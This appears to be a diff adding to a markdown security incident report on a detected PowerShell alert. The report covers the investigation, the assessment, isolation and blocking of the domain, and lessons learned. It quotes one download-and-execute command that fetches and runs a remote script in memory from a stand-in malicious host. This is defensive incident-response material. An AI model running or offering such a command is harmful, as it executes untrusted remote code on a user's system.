@@ -42,5 +42,56 @@ The alert triggered based on:
 - **Process:** powershell.exe
 - **Command Line:**
 
-`powershell
-powershell -c "IEX(New-ObjectNet.WebClient).DownloadString('http://malicious-site.com/script.ps1')"`
+`powershell -c "IEX(New-ObjectNet.WebClient).DownloadString('http://malicious-site.com/script.ps1')"`
+
+ - Potential External Domain: malicious-site.com
+
+---
+
+## Investigation
+
+Steps taken:
+
+ 1. Reviewed process creation logs (Event ID 4688)
+ 2. Analyzed the PowerShell comman line
+ 3. Identified use of `DownloadString` which indicates remote script execution
+ 4. Checked the domain reputation (suspicious/untrusted)
+ 5. Review additional activity on the host:
+    - no legitimate administrative task associated
+    - nom known IT automation using this pattern
+
+---
+
+## Assessment
+
+This activity is **likely malicious** due to:
+
+ - use of PowerShell to download external content
+ - execution of remote script in memory
+ - lack of legitimate buisiness justification
+
+This behavior is commonly associated with:
+
+ - malware delivery
+ - fileless attacks
+ - command and control activity
+
+---
+
+## Response
+
+ - Isolated the affected host from the network
+ - Terminated the PowerShell process
+ - Blocked the external domain at the firewall
+ - Initiated endpoint scan for presistense or malware
+ - Notified security team for further review
+
+---
+
+## Lessons Learned
+
+ - PowerShell is a high risk tool should be monitored closely
+ - Command line logging is critical for detecting malicious activity
+ - Detection rules should be tuned to reduce noise while catching real threats
+
+---
